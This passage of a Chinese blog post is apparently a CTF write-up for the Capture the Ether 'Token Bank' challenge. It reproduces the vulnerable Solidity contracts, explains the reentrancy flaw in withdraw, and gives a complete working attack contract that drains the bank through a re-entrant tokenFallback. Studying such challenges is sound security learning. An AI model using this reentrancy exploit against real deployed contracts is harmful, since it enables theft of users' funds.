class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    // Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] = totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            //retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;= balanceOf[from]);</span><br><span class="line">        require(value &lt;= allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token = new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        // Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        // the token contract&apos;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] = 500000 * 10**18;  // half for me</span><br><span class="line">        balanceOf[player] = 500000 * 10**18;      // half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;= balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=WDbOK_fDu9Y" target="_blank" rel="noopener">A British Bank</a>.</p>
<p>最后一道题了，有一点点长</p>
<p>上面一大堆都是代币的一些基础功能，总共发行了1,000,000 SET。看到题目合约，里面也有一个balanceOf，给合约自己和player各 500,000 （SET）</p>
<p>然后开了一个tokenFallback函数，不过只能被token合约调用。然后有一个withdraw，玩家应该是可以从这里取，然后在token合约那里就能相应的加。类似于把币从题目合约取到了token合约。不过注意道这里，先是transfer了，然后才改的状态balanceOf[msg.sender] -= amount;所以这里理论上是存在一个重入漏洞了。</p>
<p>我们先走一个流程，如果我们去取个500,000，然后第一个require能通过的，进入第二个require，会调用token.transfer，</p>
<figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> transfer(address <span class="keyword">to</span>, uint256 <span class="keyword">value</span>, <span class="built_in">bytes</span> data) public returns (<span class="built_in">bool</span>) &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;= <span class="keyword">value</span>);</span><br><span class="line"></span><br><span class="line">    balanceOf[msg.sender] -= <span class="keyword">value</span>;</span><br><span class="line">    balanceOf[<span class="keyword">to</span>] += <span class="keyword">value</span>;</span><br><span class="line">    emit <span class="type">Transfer</span>(msg.sender, <span class="keyword">to</span>, <span class="keyword">value</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isContract(<span class="keyword">to</span>)) &#123;</span><br><span class="line">        <span class="type">ITokenReceiver</span>(<span class="keyword">to</span>).tokenFallback(msg.sender, <span class="keyword">value</span>, data);</span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时msg.sender应该是题目合约，to是我们。balanceOf[msg.sender] 是有 1,000,000 SET的，所以第一个require能过，然后token给我们加，给题目合约减。接着进入一个判断，如果 to 是一个合约，则会调用 to 合约的tokenFallback函数，如果 to 是一个外部用户，就不管了。然后返回True。</p>
<p>那么正常来看这个流程是没有什么问题，但如果我们部署一个攻击合约去操作，然后里面写一个tokenFallback函数去搞点事情呢？如果我们这个tokenFallback再调一次token的transfer，那msg.sender会是我们，会扣我们的钱，这不行。去调题目合约的tokenFallback？也不行，题目合约的 tokenFallback 只让 token 合约调用。那就。。。再调一次withdraw！</p>
<p>此时流程还没走到 balanceOf[msg.sender] -= amount; 我们在题目合约的账户上还是有那么多钱的，所以能过第一个require，然后又进入到token.transfer，再给我们的账户上打一笔钱。两笔就能掏空所有题目合约上的钱了，完成解题。</p>
<p>但是这里一个问题，攻击合约在题目合约里是没有钱的，所以攻击合约就没法直接调用withdraw函数。得想办法把钱转进攻击合约里。</p>
<p>转账流程：</p>
<ol>
<li>首先用户调用withdraw，把题目合约的钱都取到token合约里，</li>
<li>然后在token合约里把钱都转进攻击合约的账户，</li>
<li>然后攻击合约把token合约里的钱都转到题目合约里去，因为题目合约里有tokenFallback，会给我们的攻击合约加钱</li>
</ol>
<p>这样在题目合约里，攻击合约的账户就有钱了，然后就可以开始withdraw了。（当然也可以直接给攻击合约approval授权）</p>
<p>攻击合约</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">contract pwn&#123;</span><br><span class="line">    SimpleERC223Token <span class="keyword">public</span> token;</span><br><span class="line">    TokenBankChallenge <span class="keyword">public</span> target;</span><br><span class="line">    uint8 <span class="keyword">public</span> reentrytimes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span>  <span class="keyword">public</span> startrenentry = <span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">()</span></span>&#123;</span><br><span class="line">        token = SimpleERC223Token(<span class="number">0x911c8EdBc4E23BC983830E369086E2DF15F0B70d</span>);</span><br><span class="line">        target = TokenBankChallenge(<span class="number">0x6A7A6DCF572c9Bd6dFdc53bBEd8Bc4602224A6f6</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        token.transfer(address(target),<span class="number">500000000000000000000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        target.withdraw(<span class="number">500000000000000000000000</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">tokenFallback</span><span class="params">(address from, uint256 value, bytes)</span> <span class="title">public</span></span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(msg.sender == address(token));</span><br><span class="line">    <span class="keyword">if</span> ( startrenentry &amp;&amp; reentrytimes &lt; <span class="number">1</span>)&#123;</span><br><span class="line">        reentrytimes += <span class="number">1</span>;</span><br><span class="line">        target.withdraw(<span class="number">500000000000000000000000</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (startrenentry == <span class="keyword">false</span>)&#123;</span><br><span class="line">        startrenentry = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span><span class="params">()</span> <span class="title">payable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述三个流程走完后，调用一下init()，把攻击合约的钱转到题目合约里去。注意到这里也会触发我们的tokenFallback，但此时我这里不想有动作，所以这里设置一个startrenentry。然后设置一下reentrytimes，这里我们只想走一遍重入就够了。（一个注意的小点，reentrytimes 状态的更改要在重入之前，不然就无限重复，最终耗尽gas而失败了。）</p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可联系QQ 643713081，也可以邮件至 643713081@qq.com </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">赏</a>
</p>


<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>cpature the ether</p>
    <p><span class="copy-title">文章字数:</span><span class="post-count">8.2k</span></p>
    <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
    <p><span class="copy-title">发布时间:</span>2022-03-08, 11:03:00</p>
    <p><span class="copy-title">最后更新:</span>2022-03-09, 00:08:22</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/2022/03/08/区块链靶场刷题之cpaturetheether/" title="cpature the ether">http://jayxv.github.io/2022/03/08/区块链靶场刷题之cpaturetheether/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2020 Van1sh</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>喜欢就点赞,疼爱就打赏</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['@Van1sh','@FzWjScJ','#Write Up','#docker','#Sage','#CTF','#Basic','#ECC','#Paillier','#Crypto','#TLS 1.2','#Web','#Files','#Serialization','#Lattice','#Dsa','#LCG','#Rc4','#SM4','#Knapsack','#Rsa','#DES','#差分密码分析','#RSA','#continued_fraction','#RE','#paper','#small private exponent','#SQL','#python','#操作模式','#number theory','#Abstract algebra','#SPN','#线性密码分析','#ETH','#Shadowsocks','#XSS','#Nmap','#Coppersmith’s Method','#Linux','#book',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
